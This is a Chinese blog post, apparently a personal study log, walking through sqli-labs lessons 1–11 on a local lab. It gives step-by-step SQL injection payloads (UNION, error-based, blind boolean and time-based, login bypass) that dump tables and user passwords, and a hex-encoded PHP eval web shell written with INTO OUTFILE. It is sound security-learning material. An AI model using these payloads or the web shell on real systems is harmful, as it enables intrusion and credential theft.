@@ -1,0 +1,1675 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/OC.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="sqli-labs,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="les1:GET-Error based-Single quotes-String">
+<meta name="keywords" content="sqli-labs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs-master">
+<meta property="og:url" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/index.html">
+<meta property="og:site_name" content="OC的部落阁">
+<meta property="og:description" content="les1:GET-Error based-Single quotes-String">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/1start.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/1formaltest.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/1singlequote.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/1key.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/1orderby.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/1unionselect.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/1position2.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/1table.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/1baocuo.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/1column.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/1column2.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/1zhi1.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/1zhi2.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/2unionselect.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/3unionselect.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/3position3.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/3zhi.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/4error.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/5urin.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/5single.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/5rand.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/5database.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/5baocuo.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/5column.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/5zhi.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/5zhi2.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/start.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/failed1.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/failed2.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/successfully.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/dbname&version.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/tables.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/columns.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/username&passwd.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/id.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/12error.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/13error.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/13successfully.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/172admin.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/17error.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/17database.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/18start.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/18failed1.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/18Dumb.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/19admin1.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/19dbname.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/20admin1.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/20dbname.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/20tables.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/20colum4.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/20column5.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/20column6.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/20no.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/20username.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/21base64.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/21dbname.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/22dbname.png">
+<meta property="og:updated_time" content="2019-08-17T06:15:13.189Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqli-labs-master">
+<meta name="twitter:description" content="les1:GET-Error based-Single quotes-String">
+<meta name="twitter:image" content="https://ocgittt.github.io/2019/07/25/sqli-labs-master/1start.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://ocgittt.github.io/2019/07/25/sqli-labs-master/">
+
+
+
+
+
+  <title>sqli-labs-master | OC的部落阁</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">OC的部落阁</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">OC is not Object-C</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ocgittt.github.io/2019/07/25/sqli-labs-master/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="OC">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OC的部落阁">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqli-labs-master</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-25T20:44:46+08:00">
+                2019-07-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="les1-GET-Error-based-Single-quotes-String"><a href="#les1-GET-Error-based-Single-quotes-String" class="headerlink" title="les1:GET-Error based-Single quotes-String"></a>les1:GET-Error based-Single quotes-String</h1><img src="/2019/07/25/sqli-labs-master/1start.png">
+<a id="more"></a>
+<p>看到please input the ID as parameter with numeric value后就GET一个id=1[常规测试]</p>
+<img src="/2019/07/25/sqli-labs-master/1formaltest.png">
+
+
+<p>有回显,则没毛病,再来个id=1’试试[单引号测试]</p>
+<img src="/2019/07/25/sqli-labs-master/1singlequote.png">
+
+<p>竟然都不行,且从报错来看,查询语句是 <code>SELECT * FROM users WHERE id=&#39;1&#39;</code> <code>LIMIT 0,1;</code>这种结构的</p>
+<p>(但是MySQL注释有3种写法①#注释[URL上要用%23注释]②– 注释(注释前面有个空格[URL上要写–%20注释])③<em>注释</em>[这种要成对出现,注入一般用不上])</p>
+<p>那就试试id=1’ or 1=’1(万能密码之一)</p>
+<img src="/2019/07/25/sqli-labs-master/1key.png">
+
+<p>有回显…但是这好像没什么卵用,还是用注释的来玩吧</p>
+
+
+<p>姿势:?id=1’ order by 3– a或1’ order by 3 %23</p>
+<img src="/2019/07/25/sqli-labs-master/1orderby.png">
+
+<p>姿势:?id=1’ order by 4– a或1’ order by 4 %23</p>
+<p>3正常而4错误,则表是有3列的</p>
+<p>接下来就要使用union联合查询(法一)</p>
+<img src="/2019/07/25/sqli-labs-master/1unionselect.png">
+
+<p>姿势:?id=0’ union select 1,2,3</p>
+<p>姿势之所以改为id=0而不是继续id=1,是因为id=1或者其他正整数的时候,会有规定的数据取出,查看了dalao的WP发现这是因为在index.php中并没有循环取出数据,因此只要把1改为0或者负数即可.</p>
+<p>由上图可发现只显示出了2,3而1则不知道哪去了…所以我们只能2或3中选一个位置来爆其他信息</p>
+<img src="/2019/07/25/sqli-labs-master/1position2.png">
+
+<p>姿势:?id=0’ union select 1,database(),version() %23</p>
+<p>database():返回当前数据库连接使用的数据库</p>
+<p>version(): 返回当前数据库的版本</p>
+<p><strong>爆表:</strong></p>
+<img src="/2019/07/25/sqli-labs-master/1table.png">
+
+<p>姿势:?id=0’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</p>
+<p>还有dalao秀了一波报错型注入(法二)?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) –+</p>
+<img src="/2019/07/25/sqli-labs-master/1baocuo.png">
+
+<p>姿势:?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) –+<br>这id=1好像不怎么影响???</p>
+<p>爆出的表有emails,referers,uagents,users</p>
+<p><strong>爆列(字段):</strong></p>
+<img src="/2019/07/25/sqli-labs-master/1column.png">
+
+<p>姿势:?id=0’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ %23</p>
+<img src="/2019/07/25/sqli-labs-master/1column2.png">
+
+<p>姿势: ?id=0’ and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’users’))) –+</p>
+<p>爆出users表中的列(字段)有id,username和password</p>
+<p>where语句等号后面的值不能纯英文,比如users需要用’users’单引号,或者使用users的十六进制where=0x7573657273</p>
+<p><strong>爆值:</strong></p>
+<img src="/2019/07/25/sqli-labs-master/1zhi1.png">
+
+<p>姿势:?id=0’ union select 1,concat(username,0x26,password),3 from users %23</p>
+<img src="/2019/07/25/sqli-labs-master/1zhi2.png">
+
+<p>姿势:id=0’ and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) –+</p>
+<p>爆出username和password的值,我用的符号是&amp;,即username&amp;password是一组</p>
+<h1 id="les2-GET-Error-based-Intiger-based"><a href="#les2-GET-Error-based-Intiger-based" class="headerlink" title="les2:GET-Error based -Intiger based"></a>les2:GET-Error based -Intiger based</h1><p>开头跟les1一样,GET一个id=1,有回显,id=1’同样跟les1错误</p>
+<p>但是id=1’ %23的时候,les1是正常的,les2却是错误</p>
+<p>所以猜测查询语句为 <strong><code>SELECT * FROM users WHERE id=</code> <code>LIMIT 0,1;</code></strong></p>
+<p>因此可以直接union查询试试是不是其他全都跟les1一样?id=1 union select 1,2,3</p>
+<img src="/2019/07/25/sqli-labs-master/2unionselect.png">
+
+<p>发现这跟les1一模一样,直接走起</p>
+<p>姿势跟les1差不多,只需去掉单引号’和最后的%23注释符/–+</p>
+<h1 id="les3-GET-Error-based-Single-quotes-with-twist-String"><a href="#les3-GET-Error-based-Single-quotes-with-twist-String" class="headerlink" title="les3:GET-Error based Single quotes with twist-String"></a>les3:GET-Error based Single quotes with twist-String</h1><p>常规操作后,猜测语句是这样的: <code>SELECT * FROM users WHERE id=(&#39;1&#39;</code>) <code>LIMIT 0,1;</code></p>
+<p>所以可以构造payload:</p>
+<p>?id=0’)语句 %23</p>
+<img src="/2019/07/25/sqli-labs-master/3unionselect.png">
+
+<img src="/2019/07/25/sqli-labs-master/3position3.png">
+
+<img src="/2019/07/25/sqli-labs-master/3zhi.png">
+
+<p>语句跟前两题一样…这题我只想着id=’input’) LIMIT 0,1,没有想到input前面也应该有个(所以我们要用)来闭合,我竟然想用(来闭合后面的,也试过?id=0)(union select 1,2,3或者是?id=0 union select 1,2,3(…这是因为一开始我觉得)是在LIMIT左边所以要这样来闭合…这也是对代码不够熟悉的问题</p>
+<h1 id="les4-GET-Error-based-Double-Quotes-String"><a href="#les4-GET-Error-based-Double-Quotes-String" class="headerlink" title="les4:GET-Error based Double Quotes-String"></a>les4:GET-Error based Double Quotes-String</h1><img src="/2019/07/25/sqli-labs-master/4error.png">
+
+<p>常规操作、单引号操作都正常，回到题目所说的double quotes string，因此来给双引号测试，果然出错，因此猜测语句是这样的: <code>SELECT * FROM users WHERE id=(</code>“input”) <code>LIMIT 0,1;</code></p>
+<p>然后操作跟之前就一样了，<strong>?id=0”) union select 1,2,3%23</strong></p>
+<p>?id=0”)语句 %23</p>
+<p>##les1-les4是union联合查询的题,分别是单引号,无引号,双引号,单引号带括号</p>
+<h1 id="les5-GET-Double-injection-Single-Quotes-String"><a href="#les5-GET-Double-injection-Single-Quotes-String" class="headerlink" title="les5:GET-Double injection-Single Quotes-String"></a>les5:GET-Double injection-Single Quotes-String</h1><p>les4/5WP: <a href="https://www.jianshu.com/p/b502893dcc81" target="_blank" rel="noopener">https://www.jianshu.com/p/b502893dcc81</a></p>
+<p>报错型注入: <a href="https://www.jianshu.com/p/8c2343705100" target="_blank" rel="noopener">https://www.jianshu.com/p/8c2343705100</a></p>
+<img src="/2019/07/25/sqli-labs-master/5urin.png">
+
+<p>les5开头也是要输入id=数字，就GET一个id=1，然后就如上图所示，跟前4题好像有点不大一样</p>
+<img src="/2019/07/25/sqli-labs-master/5single.png">
+
+<p>单引号测试，报错，猜测语句为<code>SELECT * FROM users WHERE id=&#39;input</code>‘ <code>LIMIT 0,1;</code></p>
+<p>再看题目：double injection双注入，搜索了一下，有推荐这篇文章：<a href="http://www.2cto.com/article/201303/192718.html?jovova=hvwse3" target="_blank" rel="noopener">详细讲解双查询注入</a></p>
+<p>文章讲到，双注入需要理解以下4个函数：</p>
+<p>①rand()—随机函数—生成一个0到1的随机数</p>
+<p>②floor()—取整函数—取浮点数的整数部分,如2.7123取2</p>
+<p>③count()—汇总(聚合/计数)函数—返回查询对象的总数</p>
+<p>④group by clause—分组语句—按clause对查询结果分组</p>
+<p>select concat((select database()),floor(rand()*2));//如下图所示</p>
+<img src="/2019/07/25/sqli-labs-master/5rand.png">
+
+<p><strong>数据库:</strong></p>
+<p>?id=0’ union select count(*),2,concat(‘*‘,(select database()),’*‘,floor(rand()*2))as a from information_schema.tables group by a %23</p>
+<img src="/2019/07/25/sqli-labs-master/5database.png">
+
+<p>然后打算这样<strong>爆表名</strong></p>
+<p>?id=0’ union select count(*),2,concat(‘*‘,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),’*‘,floor(rand()*2))as a from information_schema.tables group by a %23</p>
+<p>发现变成了You are in…… 但是有的dalao的WP明明是这样写的,看来还是要尝试其他姿势</p>
+<p>尝试报错型注入: ?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) –+ /<em>没错这跟les1的是一样的</em>/</p>
+<p>或者?id=1’ and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)%23</p>
+<img src="/2019/07/25/sqli-labs-master/5baocuo.png">
+
+<p>然后<strong>爆列</strong>?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=’users’))) –+</p>
+<img src="/2019/07/25/sqli-labs-master/5column.png">
+
+<p>然后<strong>爆值</strong>?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x26,password) from users)))–+</p>
+<img src="/2019/07/25/sqli-labs-master/5zhi.png">
+
+<p>再<strong>爆值</strong>?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (‘Dumb’,’I-kill-you’))))–+</p>
+<img src="/2019/07/25/sqli-labs-master/5zhi2.png">
+
+<p>好像也可以按延迟型注入来做…但暂时先按报错型注入来做吧</p>
+<h1 id="les6-GET-Double-injection-Double-Quotes-String"><a href="#les6-GET-Double-injection-Double-Quotes-String" class="headerlink" title="les6:GET-Double injection-Double Quotes-String"></a>les6:GET-Double injection-Double Quotes-String</h1><p>跟les5差不多,只要把单引号变成双引号</p>
+<p>and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) –+</p>
+<p>注意extractvalue,是extract,不是extra…</p>
+<h1 id="les7-GET-Dump-into-Outfile"><a href="#les7-GET-Dump-into-Outfile" class="headerlink" title="les7:GET-Dump into Outfile"></a>les7:GET-Dump into Outfile</h1><p>看了一下源码,sql查询语句为:</p>
+<pre><code>SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1</code></pre><p>看了一下题目,outfile,<a href="https://www.jianshu.com/p/1f97795443ce" target="_blank" rel="noopener">搜索了一下outfile是怎么回事</a>,然后构造了这样的一个payload</p>
+<pre><code>1&apos;)) select * from users into outfile &apos;D:/software/phpStudy/PHPTutorial/WWW/sqli-labs-master/Less-7/test.txt&apos; %23</code></pre><p>然后…什么事情都没有发生</p>
+<p>–2019.7.20 23:52</p>
+<p>继续，传个一句话木马上去</p>
+<pre><code>id=1&apos;))union select 1,2,(select 0x3C3F70687020406576616C28245F504F53545B276D756D61275D293B203F3E into outfile &apos;D:/software/phpStudy/phpStudy/PHPTutorial/WWW/sqli-labs-master/Less-7/test.php&apos; %23</code></pre><p>不行，看到my.ini里面#secure_file_priv = D:/backup，去掉注释，重启phpstudy进入MySQL命令行</p>
+<p>show variables like ‘secure_file_priv’;</p>
+ {% asset_img 7.png %}
+
+<pre><code>然后http://localhost/sqli-labs-master/Less-7/?id=1%27)) union select 1,2,(select 0x3C3F70687020406576616C28245F504F53545B27636D64275D293B203F3E into outfile &quot;D:\\backup\\2.php&quot;) %23</code></pre><p>然后！还是不行。。。暂时跳过，<a href="https://blog.csdn.net/qq_44105778/article/details/86926128" target="_blank" rel="noopener">贴一下我看的WP</a></p>
+<p>–2019.7.21 11:13</p>
+<h1 id="les8-GET-Blind-Boolian-Single-Quotes-String"><a href="#les8-GET-Blind-Boolian-Single-Quotes-String" class="headerlink" title="les8:GET-Blind- Boolian- Single Quotes- String"></a>les8:GET-Blind- Boolian- Single Quotes- String</h1><p>看题目得知这是一道布尔型盲注的题,首先搜索一下<a href="https://www.jianshu.com/p/f0174ea6c69d" target="_blank" rel="noopener">布尔型盲注</a></p>
+<p>有了前几题的经验直接来看看库名</p>
+<pre><code>?id=1&apos; and left(database(),8)=&apos;security&apos; %23</code></pre><p>left ( string, n )        string为要截取的字符串，n(n&gt;0)为截取的长度(从第一个字符串开始)</p>
+<p>看来库名还是security</p>
+<p>再看看表名第一位</p>
+<pre><code>?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 %23</code></pre><p>ascii()函数返回字符的ASCII码</p>
+<p>substr(string,start,length)函数/mid(string,start,length)函数:从start位开始截取string,截取length位</p>
+<p>select那个语句最后一定要有limit 0,1</p>
+<p>而100改成101的时候报错,所以表名第一位是e</p>
+<p>然后就是漫长的盲注过程…所以盲注还是适合用脚本来跑,找WP的时候看到<a href="https://blog.csdn.net/weixin_40709439/article/details/81355856" target="_blank" rel="noopener">其中一个WP</a>是有用脚本来跑的</p>
+<h1 id="les9-GET-Blind-Time-based-Single-Quotes-String"><a href="#les9-GET-Blind-Time-based-Single-Quotes-String" class="headerlink" title="les9:GET- Blind- Time based- Single Quotes- String"></a>les9:GET- Blind- Time based- Single Quotes- String</h1><p>题目是<a href="https://www.jianshu.com/p/65f05e7cc957" target="_blank" rel="noopener">时间盲注</a></p>
+<p>时间盲注：界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</p>
+<p>果然,无论我输入?id=1也好,?id=1’也罢,?id=1”什么的也都是You’re in……</p>
+<pre><code>?id=1&apos; and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null)) %23</code></pre><p>if(语句1,语句2,语句3)语句1正确则执行语句2,否则执行语句3</p>
+<p>sleep(n)将程序hold住n秒</p>
+<p>用left判断一下数据库名是不是security</p>
+<pre><code>?id=1&apos; and (if(left(database(),8)=&apos;security&apos;,sleep(10),null)) %23</code></pre><p>果然加载了10s才加载完成</p>
+<p>然后再构造一个判断表名的</p>
+<pre><code>?id=1&apos; and (if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,sleep(10),null)) %23</code></pre><p>又加载了10s,把100换成105,很快就加载出来了,看来是false了</p>
+<p>把105换成103,102,101都不行,看来第一位是101了</p>
+<p>对应ASCII码表,101为e,还记得是email</p>
+<pre><code>?id=1&apos; and (if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),5)=&apos;email&apos;,sleep(10),null)) %23</code></pre><p>果然又要加载10s才行,后面的也是差不多的操作了…手工盲注还是比较的吃力费时的</p>
+<h1 id="les10-GET-Blind-Time-based-Double-Quotes-String"><a href="#les10-GET-Blind-Time-based-Double-Quotes-String" class="headerlink" title="les10:GET-Blind- Time based- Double Quotes- String"></a>les10:GET-Blind- Time based- Double Quotes- String</h1><p>只需把les9的’改为”即可</p>
+<h1 id="les11-POST-Error-Based-Single-quotes-String"><a href="#les11-POST-Error-Based-Single-quotes-String" class="headerlink" title="les11:POST-Error Based-Single quotes-String"></a>les11:POST-Error Based-Single quotes-String</h1><img src="/2019/07/25/sqli-labs-master/start.png" title="start">
+<!--more-->
+<p>一开始如上图所示.<br>由题得知这是一道POST报错型(单引号那种语句)的题<br>有了前面简单的GET类型的题,那么就先试一下</p>
+<blockquote>
+<p>Username:admin<br>Password:1</p>
+</blockquote>
+<p>然后就</p>
+<img src="/2019/07/25/sqli-labs-master/failed1.png" title="failed">
+
+<p>再试试</p>
+<blockquote>
+<p>Username:admin<br>Password:1’ or 1=1 %23</p>
+</blockquote>
+<img src="/2019/07/25/sqli-labs-master/failed2.png" title="failed">
+
+<p>看到报错</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>就知道这#不能用%23了…都是GET顺手的锅都是顺手的锅<br>把%23改为#之后</p>
+<blockquote>
+<p>Username:admin<br>Password:1’ or 1=1#</p>
+</blockquote>
+<img src="/2019/07/25/sqli-labs-master/successfully.png" title="successfully">
+
+<p>然后</p>
+<blockquote>
+<p>1’ order by 3#</p>
+</blockquote>
+<p>报错</p>
+<blockquote>
+<p>1’ order by 2#</p>
+</blockquote>
+<p>没问题,所以只有两列<br>看了一下源码:</p>
+<blockquote>
+<p>$sql=”SELECT username, password FROM users WHERE username=’$uname’ and password=’$passwd’ LIMIT 0,1”;</p>
+</blockquote>
+<p>然而上面所做的…就是我看WP之前所能做的…<br>接下来,<a href="https://blog.csdn.net/qq_28295425/article/details/78905840" target="_blank" rel="noopener">看WP-Recar</a><br>发现原来是可以直接在username闭合然后注释掉后面的语句…我还以为要在password搞</p>
+<blockquote>
+<p>Username:’ union select database(),version()#👇</p>
+</blockquote>
+<img src="/2019/07/25/sqli-labs-master/dbname&version.png" title="dbname&version">
+
+<blockquote>
+<p>Username:’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#👇</p>
+</blockquote>
+<img src="/2019/07/25/sqli-labs-master/tables.png" title="tables">
+
+<blockquote>
+<p>Username:’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#👇</p>
+</blockquote>
+<img src="/2019/07/25/sqli-labs-master/columns.png" title="columns">
+
+<blockquote>
+<p>Username:’ union select group_concat(username),group_concat(password)from users#👇</p>
+</blockquote>
+<img src="/2019/07/25/sqli-labs-master/username&passwd.png" title="username&passwd">
+
+<blockquote>
+<p>Username:’ union select 1,group_concat(id)from users#👇</p>
+</blockquote>
+<img src="/2019/07/25/sqli-labs-master/id.png" title="id">
+
+<p>les11[完]–2019-7-26 19:58</p>
+<hr>
